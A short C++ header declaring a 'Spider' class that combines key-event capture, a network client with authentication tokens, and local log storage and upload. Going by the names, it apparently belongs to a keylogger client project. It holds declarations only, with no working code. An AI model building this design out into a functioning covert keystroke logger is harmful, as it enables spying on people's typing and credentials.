//
//  Logger.h
//  AsyncClientBoost
//
//  Created by Charles Fournier on 29/10/2014.
//  Copyright (c) 2014 Charles Fournier. All rights reserved.
//

#ifndef __AsyncClientBoost__Logger__
#define __AsyncClientBoost__Logger__

#include <stdio.h>
#include <boost/thread.hpp>
#include <string>
#include "Network.h"
#include "KeyEvents.h"
#include "LocalLog.h"
#include "Config.h"

enum e_network_state {
	DISCONNECTED,
	CONNECTED,
	AUTHENTIFIED,
	SUSPENDED
};

class Spider : public IObserver
{
private:
    Network				_network;
	e_network_state		_networkState;
	KeyEvents			_key;
	int32_t				_idClient;
	uint32_t			_tokenClient;
	std::list<Data *>	_dataList;
	std::fstream		_fstream;
	LocalLog			_localLog;
	Config				_conf;
	

public:
    Spider();
    ~Spider();
    void run();
    void networkConnect();
	void manageSend(Data *data);
	void manageResponse(bool ok, t_msg_id id);
    void update(std::string data);
	void update(void *data, int size);
	void update(Data *data);
	void writeLocal();
	void readLocal();
	void sendLocalLog();
};

#endif /* defined(__AsyncClientBoost__Logger__) */
